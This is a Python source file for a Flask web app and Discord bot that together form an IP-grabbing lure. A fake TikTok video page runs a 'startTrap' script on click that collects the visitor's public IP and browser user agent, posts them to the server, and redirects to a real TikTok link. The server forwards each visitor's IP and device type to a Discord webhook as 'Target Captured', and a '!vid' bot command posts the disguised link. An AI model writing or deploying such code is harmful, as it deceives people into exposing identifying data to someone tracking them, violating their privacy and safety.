# language: Python, file: app.py
import os
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Pulled from Railway Variables
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
RAILWAY_URL = "https://rnbw-production.up.railway.app"

FAKE_PLAYER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background-color: #000; color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .video-container { position: relative; width: 100%; max-width: 400px; background-color: #1a1a1a; aspect-ratio: 9/16; display: flex; justify-content: center; align-items: center; border-radius: 12px; overflow: hidden; }
        .thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
        .play-button { position: absolute; width: 80px; height: 80px; background-color: rgba(255, 255, 255, 0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
        .play-icon { width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
    </style>
</head>
<body>
    <div class="video-container">
        <img src="https://i.imgur.com/8QOq4w9.jpeg" class="thumbnail" alt="Thumbnail">
        <div class="play-button" onclick="startTrap()">
            <div class="play-icon"></div>
        </div>
    </div>

    <script>
        async function startTrap() {
            document.querySelector('.play-button').innerHTML = '<div style="color:white; font-weight:bold; font-size: 24px;">...</div>';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                await fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: data.ip, ua: navigator.userAgent})
                });
            } catch (e) {}
            window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(FAKE_PLAYER_HTML)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                {"name": "Wi-Fi Network", "value": "```N/A```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def vid(ctx):
    embed = discord.Embed(title="TikTok Video 🎥", description="Click to watch", color=0x2b2d31)
    embed.url = RAILWAY_URL
    embed.set_image(url="https://i.imgur.com/8QOq4w9.jpeg")
    await ctx.send(embed=embed)

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN environment variable is missing.")
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}")

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
